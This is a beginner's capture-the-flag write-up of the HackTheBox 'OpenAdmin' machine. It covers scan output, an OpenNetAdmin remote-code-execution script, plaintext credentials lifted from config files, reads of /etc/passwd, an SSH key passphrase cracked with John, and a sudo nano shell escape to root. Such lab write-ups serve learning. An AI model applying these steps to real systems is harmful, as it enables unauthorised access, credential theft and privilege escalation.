# Open Admin

*P.S. This is my first writeup ever that I wrote back in June 2020 and uploading it almost after 5 to 6 months*

So, this is my first time on any HackTheBox machine. I filtered only the easy machines on HTB and out of those I randomly selected OpenAdmin. I don't know what amount of time others took to break into this machine but for me it took almost an entire day. It took a lot of enumeration for me, maybe this was my first time that's why. My main source of all the hints was Reddit. 

Here, I will also try to put down the links that I referred while attacking the machine. So, let's begin!!!

### Reconnaissance

First things first, the base step of all the attacks: RECON! Without giving a thought I ran 4 scans simultaneously: nmap, nikto, nessus and dirb. Following are the outputs from all those 4 scans:

```
--------------------------------------------------
NESSUS SCAN
-------------------------------------------------
tester@kali:~$ nmap -T4 -A -p- 10.10.10.171
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-28 05:21 IST
Warning: 10.10.10.171 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.171
Host is up (0.14s latency).
Not shown: 65532 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
| 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
5930/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 924.92 seconds
---------------------------------------------------------------------------------------------
--------------------------------------------------------------
NIKTO SCAN
--------------------------------------------------------------
tester@kali:~$ nikto -h 10.10.10.171
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP: 10.10.10.171
+ Target Hostname: 10.10.10.171
+ Target Port: 80
+ Start Time: 2020-03-28 05:21:58 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against
some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of
the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 597dbd5dcea8b, mtime:
gzip
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for
the 2.x branch.
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7863 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time: 2020-03-28 05:43:05 (GMT5.5) (1267 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------
DIRB RESULTS
----------------------------------------------------------------
tester@kali:~$ dirb http://10.10.10.171
-----------------
DIRB v2.22
By The Dark Raver
-----------------
START_TIME: Sat Mar 28 05:22:15 2020
URL_BASE: http://10.10.10.171/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-----------------
GENERATED WORDS: 4612
---- Scanning URL: http://10.10.10.171/ ----
==> DIRECTORY: http://10.10.10.171/artwork/
+ http://10.10.10.171/index.html (CODE:200|SIZE:10918)
==> DIRECTORY: http://10.10.10.171/music/
+ http://10.10.10.171/server-status (CODE:403|SIZE:277)

---- Entering directory: http://10.10.10.171/artwork/ ----
==> DIRECTORY: http://10.10.10.171/artwork/css/
==> DIRECTORY: http://10.10.10.171/artwork/fonts/
==> DIRECTORY: http://10.10.10.171/artwork/images/
+ http://10.10.10.171/artwork/index.html (CODE:200|SIZE:14461)
==> DIRECTORY: http://10.10.10.171/artwork/js/

---- Entering directory: http://10.10.10.171/music/ ----
==> DIRECTORY: http://10.10.10.171/music/css/
==> DIRECTORY: http://10.10.10.171/music/img/
+ http://10.10.10.171/music/index.html (CODE:200|SIZE:12554)
==> DIRECTORY: http://10.10.10.171/music/js/

---- Entering directory: http://10.10.10.171/artwork/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
 (Use mode '-w' if you want to scan it anyway)
---- Entering directory: http://10.10.10.171/artwork/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
 (Use mode '-w' if you want to scan it anyway)
---- Entering directory: http://10.10.10.171/artwork/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
 (Use mode '-w' if you want to scan it anyway)
---- Entering directory: http://10.10.10.171/artwork/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
 (Use mode '-w' if you want to scan it anyway)
---- Entering directory: http://10.10.10.171/music/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
 (Use mode '-w' if you want to scan it anyway)
---- Entering directory: http://10.10.10.171/music/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
 (Use mode '-w' if you want to scan it anyway)
---- Entering directory: http://10.10.10.171/music/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
 (Use mode '-w' if you want to scan it anyway)
-----------------
END_TIME: Sat Mar 28 05:56:38 2020
DOWNLOADED: 13836 - FOUND: 4
-------------------------------------------------------------------------------------------
```



### Reconnaissance Result Analysis

Now, looking at the `nmap` scan the first thing that I felt to be exploitable was SSH open on port 22. Few more things to be observed were Apache was running on port 80 and from the header the version that it detected was 2.4.29 on Ubuntu. 

Another filtered port that I saw was 5930 but no services were detected over that port. 

Moving to `Nikto` scan, there was only one that caught my sight and it was : + Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch. 

This confirmed the detection from `nmap` that the Apache running on this machine was exploitable. 

I visited both the directories detected in `dirb` i.e. `/artwork` and `/music` and visited all sub-directories in them. In the directory `/muisc` I found a login page. So, I thought maybe I can even try SQL injection over there. One thing odd about this login page was that even though the link to login page was on `/music` homepage, the page was in a totally different directory `/ona`. 

Coming to the Nessus scan, I did not find anything of that help over there. All that I found over there was related to INFO and nothing else.

### Enumeration & Exploitation

Both enumeration & exploitation would have been two different steps but here enumeration was required at each and every step of exploitation (maybe this is my first time that's why). So, my first target was port 22 where I saw SSH running. I tried to search exploits for OpenSSH 7.6p1 on Google and other platforms but didn't find anything useful. 

The next thing that I had in my mind from recon was the login page and so I went there and tried to do basic SQL injection by entering `‘ OR ’1' = ‘1` in both username and password. But to my bad luck, this also didn’t work. Along with this I even tried other basic username and passwords like `admin:admin`, `admin:password` and others. But none of these also worked. 

At this point I was totally stuck and was not able to figure out my approach to get the access as in my recon I just determined two ways i.e. SQL injection and OpenSSH exploit. I even tried to get direct SSH access by using the command: `tester@kali:/ $ ssh 10.10.10.171`. But as expected, that also didn't work out. After like about spending an hour or so figuring out what is to be done, I decided to google some hints for this box. Not to my surprise, Reddit proved to be an useful platform. I got a hint to go for the software on which the login page was based. 

I went back to the login page and saw that it was based on OpenNetAdmin v18.1.1 (not to mention the name of the box OpenAdmin also relates to the same). Immediately I ran a google search to find any exploit for that and found a Remote Code Execution exploit on [github](https://github.com/amriunix/ona-rce ).

I cloned the repository and tried to run it. It may sound dumb but it took multiple attempts for me to execute this exploit as well. The exploit had two options 1. to check whether the target is exploitable and 2. exploit the target. I have mentioned all the attempts that I made:

```
tester@kali:~/Downloads/ona-rce$ python3 ona-rce.py check 10.10.10.171 (Failed)
tester@kali:~/Downloads/ona-rce$ python3 ona-rce.py check http://10.10.10.171 (Shows NOT Vulnerable)
tester@kali:~/Downloads/ona-rce$ python3 ona-rce.py check http://10.10.10.171/ona (Shows Vunerable)
And then finally exploited by using:
tester@kali:~/Downloads/ona-rce$ python3 ona-rce.py check http://10.10.10.171/ona
This gave me a shell to the machine. For getting further details of the machine and access level I ran the following commands:
sh$ whoami
www-data
sh$ pwd
/opt/ona/www
sh$ uname -r
4.15.0-70-generic
```

There was huge drawback to this as I was able to run only a certain commands like cat, grep, ls. Even the cd did not work, after executing the command I still remained in the same `/opt/ona/www` directory. I explored all the directories and also all the files in this directory. After exploring, I found two user credentials: 

1. `Manager:mysecretbindpassword` (From the file `config/auth_ldap.config.php`) 
2. `ona_sys:n1nj4W4rri0R!` (From the file `local/config/database_settings.inc.php`)

From the account details `ona_sys`, I thought using these credentials on the login page would lead me to admin access but none of the user details worked on the login page. Once again, I was stuck and almost felt like a dead end. Again spent an hour or so to figure out something by going through all the files in the very directory. Then I again headed back to Reddit to figure out what next steps should be taken. I found out that there were a few users about whom I needed to find details. And the best way to find details about users on a Linux system is to see the passwd file using the command: 

```
sh$ cat /etc/passwd
```

In this file I saw two users, `jimmy` and `joanna`. I tried to access the shadow file in order to access the hashes of the user's password. But the access to that file was denied. Now, what I had were 2 user account credentials and two other usernames whose password I didn't know. I assumed the next step was to access these users and then maybe I could do privilege escalation from their account. But the issue here was how to access their account as neither did I know their passwords nor their password hashes which I could break. This was again a disappointing phase for me and I read a comment on Reddit that “User's reuse their password over multiple account”. This was a hint to use the passwords that I already had. So, I tried SSH to jimmy's account using the password “mysecretbindpassword” but it didn't work, I then tried the password “n1nj4W4rri0R!” and got the access as `jimmy@opeadmin:~$`. To gain the access via SSH, I used the command: 

```
tester@kali:~$ ssh jimmy@10.10.10.171
```

Here, I thought I got the user access on the box and could also claim it on HTB but there was no `user.txt` file from where I could get the flag. So, I determined that the user flag must associated with joanna's account. I tried to get into joanna's account from jimmy's account but the access was denied. Even the command `sudo -l` didn't work. So, the next task was to get access to joanna's account and for that I needed the password to her account. I explored files that were accessible to jimmy. Because this was all around php I thought of visiting `/var/www/` over there I found a folder named `internal`. In there, I saw a file named `main.php`. It appeared to more like a php script and so I decided to curl that file. For that I needed to find out the port on which it was listening. And so I ran the command:

```
jimmy@openadmin:/var/www/internal$ netstat -lnptu
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name
tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN -
tcp 0 0 127.0.0.1:52846 0.0.0.0:* LISTEN -
tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN -
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN -
tcp6 0 0 :::80 :::* LISTEN -
tcp6 0 0 :::22 :::* LISTEN -
udp 0 0 127.0.0.53:53 0.0.0.0:* -
I tried to curl on port localhost:3306 and it didn't work. So, I went ahead and tried out on port 52846 which worked out for me
and I got the RSA Private Key for joanna's account.
jimmy@openadmin:/var/www/internal$ curl localhost:52846/main.php
```

Now that I had the RSA key, the aim was to decrypt the key and use it to access joanna's account. So, I used `ssh2john.py` to first convert the RSA Private Key to a hash form in which `JohnTheRipper` could decrypt. For this, I first copied only the RSA private key and pasted it in a new file. Then I tried to ssh2john that file but it didn't succeed. I was a bit confused tried a few more time but didn't work. Then I copied the key from the very line where it was written `-----BEGIN RSA PRIVATE KEY-----` till the line `-----END RSA PRIVATE KEY-----`. Then I again tried `ssh2john.py` and this time it worked. I used the command:

```
tester@kali:~/Desktop$ python /usr/share/john/ssh2john.py rsa > key
```

My new key was stored in a new file that I named ‘key’. The next task was to decrypt this key using JohnTheRipper. And the output was:

```
tester@kali:~/Desktop$ john --wordlist=/usr/share/wordlists/rockyou.txt key
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas (rsa)
1g 0:00:00:04 DONE (2020-03-28 16:15) 0.2475g/s 3549Kp/s 3549Kc/s 3549KC/sa6_123..*7¡Vamos!
Session completed
```

So, I got the key for joanna's account as well. The immediate next thing that I had to do was to SSH into joanna's account. I tried to do the same and enter the new password that I got but even after trying multiple times each time the permission got denied. I headed back to Reddit just to find that over there I was not supposed to enter the password but to pass the RSA key directly while logging in, so I tried the same but it didn't work this time as well and I ended up with:

```
tester@kali:~/Desktop$ ssh -i rsa joanna@10.10.10.171
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@ WARNING: UNPROTECTED PRIVATE KEY FILE! @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for ‘rsa’ are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "rsa": bad permissions
joanna@10.10.10.171's password:
Permission denied, please try again.
joanna@10.10.10.171's password: 
```

From the above details provided, what I thought that maybe the permission to the key file were too open and that's why SSH was not accepting that file. So, I decided to change the permissions setting for that file:

```
tester@kali:~/Desktop$ chmod go-r rsa 
```

This removed the read permission for group and others and then I tried to run the SSH command again. This time it worked and asked for the passphrase to which I entered the key that I decrypted i.e. `bloodninjas`. And I got the access to joanna's account as well. As soon as I got the access, the first thing that came to my mind was to submit the user hash that was stored on 'Desktop'. I did that and now only one thing was remaining which was root access. I did `sudo -l` to figure out all the permission joanna had and there I was surprised to see that joanna had sudo level access to `/bin/nano` and `/opt/priv`. I researched a bit about gaining root level access by using `nano` and found a very useful website called [GTFOBins](https://gtfobins.github.io/gtfobins/nano/).

So, I ran the nano command pointing towards priv file with sudo and ran the commands as mentions on the website given above:

```
joanna@openadmin:~$ sudo nano /opt/priv
sudo nano
^R^X
reset; sh 1>&0 2>&0
Here, I simply ran the command:
# whoami
root
# pwd
/home/joanna
# cd /root
# ls
root.txt
```

And there it was ‘root.txt’!!!!! It almost took me an entire day along with hints from Reddit to break the machine (event though it was an easy one). But I am happy as this was my 1st HTB machine!!!!!



### Some Key Points to Take Away

1. Check for the services that are running i.e OpenNetAdmin in this case and search their exploits 
2. Check all the files present in the present directory. 
3. Try to access passwd and shadow files and gain user details from there. 
4. Search for /var/www in case there is so web application hosted. 
5. Convert RSA key to hashes and then decrypt using john. 
6. Run the command sudo -l whenever you have access to any user to determine commands that can be run as sudo and use GTFOBins for those commands.